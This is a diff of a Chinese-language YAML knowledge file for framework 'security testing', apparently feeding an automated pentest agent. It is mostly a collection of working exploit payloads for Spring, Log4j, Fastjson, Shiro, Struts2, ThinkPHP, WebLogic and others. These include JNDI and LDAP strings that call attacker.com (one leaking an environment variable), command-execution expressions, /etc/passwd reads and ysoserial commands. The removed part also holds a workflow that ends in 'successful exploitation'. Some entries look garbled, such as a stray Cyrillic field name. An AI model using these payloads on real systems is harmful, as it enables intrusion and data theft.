@@ -1,390 +1,55 @@
-name: "框架安全测试"
-description: "Spring、Django、Flask等框架安全测试"
-domain: "web"
-version: "1.0"
+name: 框架安全测试
+description: Spring、Django、Flask等框架安全测试
+domain: web
+version: '1.0'
 tags:
-  - web
-  - framework
-  - spring
-  - django
-
-knowledge: |
-  # 框架漏洞补充
-  
-  ## 1. Spring Boot Actuator
-  
-  ### 端点探测
-  
-  ```
-  /actuator
-  /actuator/env
-  /actuator/health
-  /actuator/heapdump
-  /actuator/loggers
-  /actuator/refresh
-  /actuator/mappings
-  /actuator/beans
-  /actuator/scheduledtasks
-  /actuator/conditions
-  ```
-  
-  ### 环境变量泄露
-  
-  ```
-  /actuator/env
-  GET /actuator/env/{name}
-  ```
-  
-  ### RCE利用
-  
-  ```
-  POST /actuator/refresh
-  Content-Type: application/json
-  
-  {"name":"test","value":"#{T(java.lang.Runtime).getRuntime().exec('whoami')}"}
-  ```
-  
-  ### Jolokia RCE
-  
-  ```
-  /actuator/jolokia/exploit
-  ```
-  
-  ---
-  
-  ## 2. Spring Cloud Gateway RCE (CVE-2022-22947)
-  
-  ```
-  POST /actuator/gateway/routes/hack
-  {
-    "id": "hacked",
-    "filters": [{
-      "name": "AddResponseHeader",
-      "args": {
-        "nameValue": "result",
-        "value": "#{new String(T(java.lang.Runtime).getRuntime().exec('whoami').inputStream.readAllBytes())}"
-      }
-    }],
-    "uri": "http://example.com",
-    "order": 0
-  }
-  ```
-  
-  ---
-  
-  ## 3. Spring WebFlow RCE (CVE-2017-4971)
-  
-  ```
-  <form id="f" action="http://target:8080/login" method="post">
-    <input name="execution" value="e4s1"/>
-    <input name="_eventId" value="view"/>
-    <input type="submit" id="btn"/>
-  </form>
-  
-  添加header:
-  Cookie: JSESSIONID=xxx
-  ```
-  
-  ---
-  
-  ## 4. Spring Data Rest RCE (CVE-2017-8046)
-  
-  ```
-  PATCH /users/1
-  Content-Type: application/json
-  
-  {"name": "test", "age": 1, "ружителей": "T(java.lang.Runtime).getRuntime().exec('whoami')"}
-  ```
-  
-  ---
-  
-  ## 5. Spring SpEL注入
-  
-  ### 基础RCE
-  
-  ```
-  ${T(java.lang.Runtime).getRuntime().exec('id')}
-  ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
-  ```
-  
-  ### 读取文件
-  
-  ```
-  ${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File).new('/etc/passwd'))}
-  ```
-  
-  ---
-  
-  ## 6. Log4j RCE (CVE-2021-44228)
-  
-  ### 基础Payload
-  
-  ```
-  ${jndi:ldap://attacker.com/a}
-  ${${lower:j}ndi:${lower:l}dap://attacker.com/a}
-  ```
-  
-  ### 变形Payload
-  
-  ```
-  ${jndi:rmi://attacker.com/Exploit}
-  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
-  ${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/${env:USER}}
-  ```
-  
-  ---
-  
-  ## 7. Log4j 2.X RCE (CVE-2021-45046)
-  
-  ```
-  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
-  ${jndi:ldap://127.0.0.1/${${sys:java.version}}.log}
-  ```
-  
-  ---
-  
-  ## 8. Fastjson反序列化
-  
-  ### 基础Payload
-  
-  ```
-  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
-  ```
-  
-  ### JdbcRowSetImpl
-  
-  ```
-  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
-  ```
-  
-  ### TemplatesImpl
-  
-  ```
-  {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64"],"_name":"a","_tfactory":{},"_outputProperties":{}}
-  ```
-  
-  ---
-  
-  ## 9. Shiro反序列化
-  
-  ### RememberMe攻击
-  
-  ```
-  # 常见密钥
-  kPH+bIxk5D2deZiIxcaaaA==
-  4AvVhmFLUs0KTA3KprsdGv==
-  2AvVhdsgPKx6SN9QAtgZ5cS3GJdO+R2MkY2QE4wfVG+lPvEllb6CdArF
-  
-  # 工具
-  java -jar shiro-attack-2.0.jar
-  java -jar ysoserial.jar CommonsBeanUtils1 "command"
-  ```
-  
-  ---
-  
-  ## 10. Struts2 RCE
-  
-  ### 基础Payload
-  
-  ```
-  %{#a=(new java.lang.ProcessBuilder('id')).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[4096],#d.read(#e),#t=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#t.getWriter().write(new java.lang.String(#e))}
-  ```
-  
-  ### S2-016
-  
-  ```
-  redirect:${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23memberAccess,true),%23a=(new java.lang.ProcessBuilder('whoami')).start(),%23b=%23a.getInputStream(),%23c=new java.io.BufferedReader(new java.io.InputStreamReader(%23b)),%23d=new char[50000],%23c.read(%23d),%23t=%23context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],%23t.getWriter().write(%23d)}
-  ```
-  
-  ---
-  
-  ## 11. ThinkPHP RCE
-  
-  ### 5.x RCE
-  
-  ```
-  ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
-  ```
-  
-  ### 5.0.x RCE
-  
-  ```
-  /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
-  ```
-  
-  ### 5.1.x RCE
-  
-  ```
-  /index.php?s=index/\think\Request/input&filter=system&whoami
-  ```
-  
-  ---
-  
-  ## 12. Laravel RCE
-  
-  ### .env泄露
-  
-  ```
-  /.env
-  /.env.bak
-  /.env.backup
-  ```
-  
-  ### 密钥利用
-  
-  ```
-  php artisan tinker
-  App::make('config')->set('database.connections.mysql.host', 'xxx')
-  ```
-  
-  ### 序列化RCE (Laravel <= 8.4.2)
-  
-  ```
-  # 使用laravel-exploits
-  python3 laravel-ignition-exploit.py URL COMMAND
-  ```
-  
-  ---
-  
-  ## 13. Django
-  
-  ### 配置文件泄露
-  
-  ```
-  /settings.py
-  /urls.py
-  /admin.py
-  ```
-  
-  ### 调试模式RCE
-  
-  ```
-  # 设置DEBUG=True
-  # 访问不存在页面会显示敏感信息
-  ```
-  
-  ---
-  
-  ## 14. Flask
-  
-  ### 配置文件泄露
-  
-  ```
-  config.py
-  instance/config.py
-  ```
-  
-  ### 模板注入
-  
-  ```
-  # Jinja2 SSTI
-  {{config.items()}}
-  {{request}}
-  ```
-  
-  ---
-  
-  ## 15. WebLogic RCE
-  
-  ### XMLDecoder
-  
-  ```
-  POST /wls-wsat/CoordinatorPortType
-  Content-Type: text/xml
-  
-  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
-  <soapenv:Header>
-  <work:WorkContext xmlns:work="http://bea.com/2003/05/soap-envelope">
-  <java version="1.8.0_151" class="java.beans.Expression">
-  <object class="java.lang.Runtime" method="getRuntime">
-  <void method="exec">
-  <array class="java.lang.String" length="1">
-  <void index="0"><string>whoami</string></void>
-  </array>
-  </void>
-  </object>
-  </java>
-  </work:WorkContext>
-  </soapenv:Header>
-  <soapenv:Body/>
-  </soapenv:Envelope>
-  ```
-  
-  ### T3协议
-  
-  ```
-  # 使用weblogic.py
-  python3 weblogic.py target:7001 cmd
-  ```
-  
-  ---
-  
-  ## 16. JBoss反序列化
-  
-  ### 探测
-  
-  ```
-  /invoker/JMXInvokerServlet
-  /admin-console
-  /jbossws/
-  ```
-  
-  ### 利用
-  
-  ```
-  # 使用ysoserial
-  java -jar ysoserial.jar CommonsCollections1 "command" > payload.ser
-  
-  # 上传payload
-  ```
-  
-  ---
-  
-  ## 17. Tomcat
-  
-  ### CVE-2020-1938 (Ghostcat)
-  
-  ```
-  # 读取WEB-INF/web.xml
-  java -jar ajp.jar target 8009 /WEB-INF/web.xml
-  ```
-  
-  ### 弱口令+WAR部署
-  
-  ```
-  # 上传war包
-  ```
-  
-  ---
-  
-  ## 18. Hudson CI RCE
-  
-  ```
-  /script
-  /job/xxx/config.xml
-  ```
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- framework
+- spring
+- django
+knowledge: "# 框架漏洞补充\n\n## 1. Spring Boot Actuator\n\n### 端点探测\n\n```\n/actuator\n/actuator/env\n/actuator/health\n/actuator/heapdump\n\
+  /actuator/loggers\n/actuator/refresh\n/actuator/mappings\n/actuator/beans\n/actuator/scheduledtasks\n/actuator/conditions\n\
+  ```\n\n### 环境变量泄露\n\n```\n/actuator/env\nGET /actuator/env/{name}\n```\n\n### RCE利用\n\n```\nPOST /actuator/refresh\nContent-Type:\
+  \ application/json\n\n{\"name\":\"test\",\"value\":\"#{T(java.lang.Runtime).getRuntime().exec('whoami')}\"}\n```\n\n###\
+  \ Jolokia RCE\n\n```\n/actuator/jolokia/exploit\n```\n\n---\n\n## 2. Spring Cloud Gateway RCE (CVE-2022-22947)\n\n```\n\
+  POST /actuator/gateway/routes/hack\n{\n  \"id\": \"hacked\",\n  \"filters\": [{\n    \"name\": \"AddResponseHeader\",\n\
+  \    \"args\": {\n      \"nameValue\": \"result\",\n      \"value\": \"#{new String(T(java.lang.Runtime).getRuntime().exec('whoami').inputStream.readAllBytes())}\"\
+  \n    }\n  }],\n  \"uri\": \"http://example.com\",\n  \"order\": 0\n}\n```\n\n---\n\n## 3. Spring WebFlow RCE (CVE-2017-4971)\n\
+  \n```\n<form id=\"f\" action=\"http://target:8080/login\" method=\"post\">\n  <input name=\"execution\" value=\"e4s1\"/>\n\
+  \  <input name=\"_eventId\" value=\"view\"/>\n  <input type=\"submit\" id=\"btn\"/>\n</form>\n\n添加header:\nCookie: JSESSIONID=xxx\n\
+  ```\n\n---\n\n## 4. Spring Data Rest RCE (CVE-2017-8046)\n\n```\nPATCH /users/1\nContent-Type: application/json\n\n{\"name\"\
+  : \"test\", \"age\": 1, \"ружителей\": \"T(java.lang.Runtime).getRuntime().exec('whoami')\"}\n```\n\n---\n\n## 5. Spring\
+  \ SpEL注入\n\n### 基础RCE\n\n```\n${T(java.lang.Runtime).getRuntime().exec('id')}\n${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}\n\
+  ```\n\n### 读取文件\n\n```\n${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File).new('/etc/passwd'))}\n```\n\
+  \n---\n\n## 6. Log4j RCE (CVE-2021-44228)\n\n### 基础Payload\n\n```\n${jndi:ldap://attacker.com/a}\n${${lower:j}ndi:${lower:l}dap://attacker.com/a}\n\
+  ```\n\n### 变形Payload\n\n```\n${jndi:rmi://attacker.com/Exploit}\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}\n\
+  ${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/${env:USER}}\n```\n\n---\n\n## 7. Log4j 2.X RCE (CVE-2021-45046)\n\
+  \n```\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}\n${jndi:ldap://127.0.0.1/${${sys:java.version}}.log}\n\
+  ```\n\n---\n\n## 8. Fastjson反序列化\n\n### 基础Payload\n\n```\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\"\
+  :\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n```\n\n### JdbcRowSetImpl\n\n```\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"\
+  ,\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n```\n\n### TemplatesImpl\n\n```\n{\"@type\":\"\
+  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"base64\"],\"_name\":\"a\",\"_tfactory\":{},\"\
+  _outputProperties\":{}}\n```\n\n---\n\n## 9. Shiro反序列化\n\n### RememberMe攻击\n\n```\n# 常见密钥\nkPH+bIxk5D2deZiIxcaaaA==\n4AvVhmFLUs0KTA3KprsdGv==\n\
+  2AvVhdsgPKx6SN9QAtgZ5cS3GJdO+R2MkY2QE4wfVG+lPvEllb6CdArF\n\n# 工具\njava -jar shiro-attack-2.0.jar\njava -jar ysoserial.jar\
+  \ CommonsBeanUtils1 \"command\"\n```\n\n---\n\n## 10. Struts2 RCE\n\n### 基础Payload\n\n```\n%{#a=(new java.lang.ProcessBuilder('id')).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new\
+  \ java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[4096],#d.read(#e),#t=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#t.getWriter().write(new\
+  \ java.lang.String(#e))}\n```\n\n### S2-016\n\n```\nredirect:${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23memberAccess,true),%23a=(new\
+  \ java.lang.ProcessBuilder('whoami')).start(),%23b=%23a.getInputStream(),%23c=new java.io.BufferedReader(new java.io.InputStreamReader(%23b)),%23d=new\
+  \ char[50000],%23c.read(%23d),%23t=%23context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],%23t.getWriter().write(%23d)}\n\
+  ```\n\n---\n\n## 11. ThinkPHP RCE\n\n### 5.x RCE\n\n```\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n\
+  ```\n\n### 5.0.x RCE\n\n```\n/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n\
+  ```\n\n### 5.1.x RCE\n\n```\n/index.php?s=index/\\think\\Request/input&filter=system&whoami\n```\n\n---\n\n## 12. Laravel\
+  \ RCE\n\n### .env泄露\n\n```\n/.env\n/.env.bak\n/.env.backup\n```\n\n### 密钥利用\n\n```\nphp artisan tinker\nApp::make('config')->set('database.connections.mysql.host',\
+  \ 'xxx')\n```\n\n### 序列化RCE (Laravel <= 8.4.2)\n\n```\n# 使用laravel-exploits\npython3 laravel-ignition-exploit.py URL COMMAND\n\
+  ```\n\n---\n\n## 13. Django\n\n### 配置文件泄露\n\n```\n/settings.py\n/urls.py\n/admin.py\n```\n\n### 调试模式RCE\n\n```\n# 设置DEBUG=True\n\
+  # 访问不存在页面会显示敏感信息\n```\n\n---\n\n## 14. Flask\n\n### 配置文件泄露\n\n```\nconfig.py\ninstance/config.py\n```\n\n### 模板注入\n\n```\n\
+  # Jinja2 SSTI\n{{config.items()}}\n{{request}}\n```\n\n---\n\n## 15. WebLogic RCE\n\n### XMLDecoder\n\n```\nPOST /wls-wsat/CoordinatorPortType\n\
+  Content-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n<soapenv:Header>\n\
+  <work:WorkContext xmlns:work=\"http://bea.com/2003/05/soap-envelope\">\n<java version=\"1.8.0_151\" class=\"java.beans.Expression\"\
+  >\n<object class=\"java.lang.Runtime\" method=\"getRuntime\">\n<void method=\"exec\">\n<array class=\"java.lang.String\"\
+  \ length=\"1\">\n<void index=\"0\"><string>whoami</string></void>\n</array>\n</void>\n</object>\n</java>\n</work:WorkContext>\n\
+  </soapenv:Header>\n<soapenv:Body/>\n</soapenv:Envelope>\n```\n\n### T3协议\n\n```\n# 使用weblogic.py\npython3 weblogic.py target:7001\
+  \ cmd\n```\n\n---\n\n## 16. JBoss反序列化\n\n### 探测\n\n```\n/invoker/JMXInvokerServlet\n/admin-console\n/jbossws/\n```\n\n###\
+  \ 利用\n\n```\n# 使用ysoserial\njava -jar ysoserial.jar CommonsCollections1 \"command\" > payload.ser\n\n# 上传payload\n```\n\n\
+  ---\n\n## 17. Tomcat\n\n### CVE-2020-1938 (Ghostcat)\n\n```\n# 读取WEB-INF/web.xml\njava -jar ajp.jar target 8009 /WEB-INF/web.xml\n\
+  ```\n\n### 弱口令+WAR部署\n\n```\n# 上传war包\n```\n\n---\n\n## 18. Hudson CI RCE\n\n```\n/script\n/job/xxx/config.xml\n```\n"
